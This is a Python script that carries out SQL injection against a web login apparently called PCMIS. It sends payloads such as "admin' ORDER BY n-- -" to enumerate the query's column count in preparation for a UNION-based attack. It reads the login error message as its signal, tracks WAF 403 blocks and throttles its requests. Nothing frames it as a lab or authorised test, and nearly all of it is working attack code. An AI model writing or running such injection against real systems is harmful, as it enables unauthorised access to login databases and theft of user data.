"""Column-count enumeration on the PCMIS login via ORDER BY, then UNION.

Signal: the baseline error 'wrong user name OR password' means the SQL failed
or matched nothing; its absence means the query executed and matched.
"""
import re
import sys
import time

sys.path.insert(0, ".")
import mislogin  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

ERR = "wrong user name OR password"
PAUSE = 4


def test(user, pwd="x"):
    time.sleep(PAUSE)
    meta, txt, raw = mislogin.attempt(user, pwd)
    if "after=0" in meta or "post=0" in meta:
        return "DOWN", txt
    if "post=403" in meta:
        return "WAF403", txt
    if ERR in txt:
        return "error", txt
    return "ok", txt


print("== ORDER BY sweep (stop where it errors)")
last_ok = 0
for n in range(1, 13):
    st, txt = test(f"admin' ORDER BY {n}-- -")
    print(f"  ORDER BY {n:2} -> {st}")
    if st == "DOWN":
        break
    if st == "error":
        print(f"  column count is probably {n - 1}")
        break
    last_ok = n

print(f"\nlast clean ORDER BY: {last_ok}")
